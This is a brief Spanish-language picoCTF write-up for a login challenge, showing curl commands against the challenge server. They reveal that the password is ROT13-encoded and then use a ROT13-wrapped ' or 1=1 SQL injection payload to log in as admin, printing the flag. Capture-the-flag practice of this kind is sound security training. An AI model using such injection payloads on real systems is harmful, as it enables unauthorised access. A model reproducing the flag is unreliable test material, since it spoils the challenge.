## Objetivo 
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/29132/` ([link](https://jupiter.challenges.picoctf.org/problem/29132/)) or http://jupiter.challenges.picoctf.org:29132. Try to see if you can login as admin!

## Solución
```bash
root@DESKTOP-8T8TJ1H:~# curl https://jupiter.challenges.picoctf.org/problem/29132/login.php -d "password=admin&debug=1"
<pre>password: admin
SQL query: SELECT * FROM admin where password = 'nqzva'
</pre><h1>Login failed.</h1>root@DESKTOP-8T8TJ1H:~#
root@DESKTOP-8T8TJ1H:~# curl https://jupiter.challenges.picoctf.org/problem/29132/login.php -d "password=' be 1=1;&debug
=1"
<pre>password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_06a9db19}</p>root@DESKTOP-8T8TJ1H:~#
root@DESKTOP-8T8TJ1H:~#
```
## Notas
la pagina aplicaba rot13 a la contraseña ingresada para modificarla y evitar sql injection.

## Referencias
https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)&input=bnF6dmE
https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)&input=JyBvciAxPTE7